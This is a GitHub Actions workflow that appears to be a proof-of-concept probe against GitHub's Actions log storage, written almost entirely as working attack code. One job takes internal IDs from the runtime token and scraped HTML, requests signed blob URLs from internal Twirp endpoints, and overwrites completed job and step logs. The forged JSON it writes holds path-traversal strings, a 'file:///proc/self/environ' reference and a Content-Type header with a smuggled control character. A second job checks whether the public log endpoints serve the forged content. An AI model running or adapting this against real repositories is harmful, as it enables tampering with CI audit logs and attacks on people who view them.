name: Probe completed Actions log blob carrier
on:
  workflow_dispatch:
permissions:
  actions: read
  contents: read
jobs:
  carrier:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Carrier seed
        run: echo "seed log for carrier test"
      - name: Overwrite completed log blobs
        uses: actions/github-script@v8
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          github-token: ${{ github.token }}
          script: |
            const repo = process.env.GITHUB_REPOSITORY;
            const runId = Number(process.env.GITHUB_RUN_ID);
            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
            const results = process.env.ACTIONS_RESULTS_URL;
            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
            const parts = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:')).split(':');
            const ids = {workflow_run_backend_id: parts[1], workflow_job_run_backend_id: parts[2]};
            const gh = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github+json', 'User-Agent': 'own-log-carrier-check'};
            const api = 'https://api.github.com/repos/' + repo;
            const list = await fetch(api + '/actions/runs/' + runId + '/jobs?per_page=100', {headers: gh});
            if (!list.ok) throw new Error('jobs HTTP ' + list.status);
            const jobs = (await list.json()).jobs;
            const job = jobs.find(j => j.name === 'carrier') || jobs[0];
            if (!job) throw new Error('current carrier job not listed');
            const seedNumber = 2;
            const page = await fetch('https://github.com/' + repo + '/actions/runs/' + runId + '/job/' + job.id, {headers: {'User-Agent':'own-log-carrier-check'}});
            const html = await page.text();
            const stepBackend = html.match(/<check-step\b(?=[^>]*data-name="Carrier seed")(?=[^>]*data-external-id="([0-9a-f-]{36})")[^>]*>/i)?.[1];
            console.log('JOB=' + job.id + ' STEP=' + seedNumber + ' STEP_BACKEND=' + (stepBackend || 'missing'));
            async function twirp(method, data) {
              const r = await fetch(new URL('twirp/results.services.receiver.Receiver/' + method, results), {method:'POST', headers:{Authorization:'Bearer ' + runtime, 'Content-Type':'application/json'}, body:JSON.stringify(data)});
              const t = await r.text();
              if (!r.ok) throw new Error(method + ' HTTP ' + r.status + ': ' + t.slice(0,160));
              return JSON.parse(t);
            }
            async function put(label, method, data, body) {
              const signed = await twirp(method, data);
              const u = signed.logs_url;
              if (!u) throw new Error(label + ' missing logs_url');
              const r = await fetch(u, {method:'PUT', headers:{'x-ms-blob-type':'BlockBlob','Content-Type':'application/json\u0085','x-ms-version':'2023-11-03'}, body});
              console.log(label + '_PUT=' + r.status + ' SP=' + new URL(u).searchParams.get('sp'));
              await r.arrayBuffer();
            }
            const jobPath = 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/logs';
            const jobBody = Buffer.from(JSON.stringify({full_name:jobPath,owner:{login:'probe',avatar_url:'file:///proc/self/environ'},description:'completed job-log carrier',stargazers_count:7}));
            await put('JOB_LOG', 'GetJobLogsSignedBlobURL', ids, jobBody);
            if (stepBackend) {
              const stepPath = 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/steps/' + seedNumber + '/logs';
              const stepBody = Buffer.from(JSON.stringify({full_name:stepPath,owner:{login:'probe',avatar_url:'file:///proc/self/environ'},description:'completed step-log carrier',stargazers_count:7}));
              await put('STEP_LOG', 'GetStepLogsSignedBlobURL', {...ids,step_backend_id:stepBackend}, stepBody);
            }
  verify:
    needs: carrier
    runs-on: ubuntu-latest
    steps:
      - name: Read completed log endpoints
        uses: actions/github-script@v8
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          github-token: ${{ github.token }}
          script: |
            const repo = process.env.GITHUB_REPOSITORY;
            const runId = Number(process.env.GITHUB_RUN_ID);
            const gh = {Authorization:'Bearer ' + process.env.GH_TOKEN,Accept:'application/vnd.github+json','User-Agent':'own-log-carrier-check'};
            const api = 'https://api.github.com/repos/' + repo;
            const list = await fetch(api + '/actions/runs/' + runId + '/jobs?per_page=100',{headers:gh});
            if (!list.ok) throw new Error('jobs HTTP ' + list.status);
            const jobs = (await list.json()).jobs;
            const job = jobs.find(j=>j.name==='carrier');
            if (!job) throw new Error('carrier job missing');
            async function inspect(label, endpoint, expected) {
              const first = await fetch(endpoint,{headers:gh,redirect:'manual'});
              const loc = first.headers.get('location');
              if (first.status !== 302 || !loc) { console.log(label + ' API=' + first.status + ' TYPE=' + first.headers.get('content-type')); return; }
              const raw = await fetch(loc,{redirect:'manual'});
              const body = Buffer.from(await raw.arrayBuffer());
              const type = raw.headers.get('content-type') || '';
              console.log(label + ' API=302 RAW=' + raw.status + ' MIME=' + JSON.stringify(type) + ' N=' + body.length + ' EXACT=' + body.equals(expected) + ' HEAD=' + body.subarray(0,24).toString('hex'));
            }
            const seedNumber = 2;
            const jobPath = 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/logs';
            const jobBody = Buffer.from(JSON.stringify({full_name:jobPath,owner:{login:'probe',avatar_url:'file:///proc/self/environ'},description:'completed job-log carrier',stargazers_count:7}));
            const stepPath = 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/steps/' + seedNumber + '/logs';
            const stepBody = Buffer.from(JSON.stringify({full_name:stepPath,owner:{login:'probe',avatar_url:'file:///proc/self/environ'},description:'completed step-log carrier',stargazers_count:7}));
            await inspect('JOB_LOG',api + '/actions/jobs/' + job.id + '/logs',jobBody);
            await inspect('STEP_LOG',api + '/actions/jobs/' + job.id + '/steps/' + seedNumber + '/logs',stepBody);
